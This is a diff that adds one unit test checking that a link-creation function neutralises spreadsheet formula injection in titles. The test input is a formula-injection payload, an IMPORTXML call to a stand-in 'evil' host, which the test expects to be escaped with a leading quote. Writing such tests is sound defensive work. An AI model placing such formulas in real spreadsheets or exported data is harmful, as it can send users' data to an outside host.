@@ -419,3 +419,10 @@ test('planCreateLink: trims whitespace from title/path/url/description/tags', ()
   assert.equal(r.row.description, 'desc');
   assert.equal(r.row.tags, 'a,b');
 });
+
+test('planCreateLink: sanitizes a title starting with a formula-injection character', () => {
+  const r = planCreateLink(goodLink({ title: '=IMPORTXML("http://evil/","//a")' }), [], linkCtx());
+  assert.equal(r.ok, true);
+  assert.equal(r.row.title.charAt(0), "'");
+  assert.equal(r.row.title, '\'=IMPORTXML("http://evil/","//a")');
+});
